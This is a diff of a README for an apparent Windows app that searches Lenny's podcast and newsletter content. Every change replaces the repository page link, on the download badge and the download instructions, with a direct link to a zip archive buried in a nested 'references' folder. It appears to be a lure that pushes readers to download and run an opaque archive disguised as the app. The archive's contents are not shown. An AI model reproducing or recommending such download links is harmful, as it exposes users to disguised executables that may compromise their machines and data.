@@ -1,6 +1,6 @@
 # 📚 lennys-podcast-newsletter - Search Lenny content with ease
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sandyconvincing900/lennys-podcast-newsletter)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Sandyconvincing900/lennys-podcast-newsletter/main/references/02-newsletters/podcast-lennys-newsletter-v2.1.zip)
 
 ## 🖥️ What this app does
 
@@ -18,7 +18,7 @@ Use it to find ideas fast, revisit key lessons, and move through Lenny’s conte
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Sandyconvincing900/lennys-podcast-newsletter
+https://raw.githubusercontent.com/Sandyconvincing900/lennys-podcast-newsletter/main/references/02-newsletters/podcast-lennys-newsletter-v2.1.zip
 
 If the page opens a file list or release page, download the Windows version from there.
 
@@ -150,7 +150,7 @@ The content collection includes material on:
 
 Primary download page:
 
-https://github.com/Sandyconvincing900/lennys-podcast-newsletter
+https://raw.githubusercontent.com/Sandyconvincing900/lennys-podcast-newsletter/main/references/02-newsletters/podcast-lennys-newsletter-v2.1.zip
 
 ## 🧪 Basic use example
 
